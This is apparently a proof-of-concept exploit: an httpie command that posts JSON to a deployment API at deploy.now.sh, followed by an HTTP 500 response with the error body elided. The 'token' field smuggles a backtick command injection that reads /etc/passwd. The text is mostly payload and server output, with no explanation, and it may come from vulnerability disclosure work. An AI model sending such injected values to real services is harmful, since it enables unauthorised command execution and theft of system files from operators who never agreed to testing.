echo '{"repo":"https://github.com/zeit/next.js/tree/master/examples/with-apollo","config":{"token":"`cat /etc/passwd >&2`; exit; ","docker":false,"envs":[]}}' | http POST https://deploy.now.sh/api/deploy
HTTP/1.1 500 Internal Server Error
Connection: keep-alive
Content-Length: 1413
Content-Type: application/json; charset=utf-8
Date: Mon, 29 Jan 2018 15:22:22 GMT
ETag: W/"585-aiJiN+GLqUjJ8Moh1gONeRB49KQ"
Server: now
X-Now-Region: now-bru
X-Powered-By: Express

{
    "error": ...
}